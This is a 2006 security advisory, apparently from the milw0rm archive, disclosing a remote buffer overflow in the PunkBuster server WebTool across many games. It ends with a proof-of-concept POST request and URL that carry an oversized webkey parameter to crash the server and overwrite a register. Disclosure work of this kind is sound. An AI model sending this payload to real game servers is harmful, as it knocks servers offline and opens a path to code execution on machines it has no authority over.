@@ -1,0 +1,79 @@
+                             Luigi Auriemma
+
+##############################################################################
+
+Application:  PunkBuster
+              http://www.punkbuster.com
+Versions:     PunkBuster for servers, versions minor than v1.229:
+                America's Army                  <= v1.228
+                Battlefield 1942                <= v1.158
+                Battlefield 2                   <= v1.184
+                Battlefield Vietnam             <= v1.150
+                Call of Duty                    <= v1.173
+                Call of Duty 2                  <= v1.108
+                DOOM 3                          <= v1.159
+                Enemy Territory                 <= v1.167
+                Far Cry                         <= v1.150
+                F.E.A.R.                        <= v1.093
+                Joint Operations                <= v1.187
+                Quake III Arena                 <= v1.150
+                Quake 4                         <= v1.181
+                Rainbow Six 3: Raven Shield     <= v1.169
+                Rainbow Six 4: Lockdown         <= v1.093
+                Return to Castle Wolfenstein    <= v1.175
+                Soldier of Fortune II           <= v1.183
+Platforms:    Win32, Linux and Mac
+Bug:          buffer overflow in the built-in web server for the remote
+              server's administration (WebTool)
+Exploitation: remote, versus server
+Date:         23 May 2006
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+##############################################################################
+
+This web server is not enabled by default but must be activated
+selecting the TCP port on which running the service using the command:
+pb_sv_httpport PORT
+
+The authentication mechanism is handled through a parameter called
+webkey followed by the password and sent by the client using the POST
+method or directly in the URL.
+
+A webkey longer than 1024 bytes exploits a buffer-overflow which
+happens when the program uses the memcpy function for copying the
+attacker string in a limited buffer used for the comparison with the
+valid service's password.
+
+The following is the code from the pbsv.dll 1.183 of the game Soldier
+of Fortune II where happens the exception which interrupts the game:
+
+...
+0511B3A8   8BB424 58100000  MOV ESI,DWORD PTR SS:[ESP+1058]
+0511B3AF   8D4424 18        LEA EAX,DWORD PTR SS:[ESP+18]
+0511B3B3   6A 41            PUSH 41
+0511B3B5   50               PUSH EAX
+0511B3B6   C68424 55100000 >MOV BYTE PTR SS:[ESP+1055],0
+0511B3BE   FF96 54010000    CALL DWORD PTR DS:[ESI+154]
+0511B3C4   8BBC24 64100000  MOV EDI,DWORD PTR SS:[ESP+1064]
+...
+
+The ESI register is controlled by the attacker.
+The memcpy function described above instead is located at offset
+0512aea7.
+
+##############################################################################
+
+Send the following text file to the port on which is running PunkBuster
+
+POST /pbsvweb HTTP/1.1
+
+webkey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffff
+cmds=Command Screen
+
+or simply build and use a link like the following:
+
+ http://127.0.0.1:80/pbsvweb/plist=1&webkey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffff
+
+# milw0rm.com [2006-05-23]
